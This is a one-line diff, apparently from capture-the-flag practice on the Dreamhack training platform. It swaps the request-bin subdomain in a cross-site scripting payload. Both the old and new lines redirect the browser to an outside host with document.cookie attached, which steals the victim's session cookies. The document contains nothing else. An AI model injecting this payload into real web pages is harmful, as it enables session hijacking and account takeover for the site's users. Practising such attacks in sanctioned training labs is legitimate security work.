@@ -1,1 +1,1 @@
-location.href="https://qezvtjn.request.dreamhack.games?memo="+document.cookie;
+location.href="https://pjzidob.request.dreamhack.games?memo="+document.cookie;
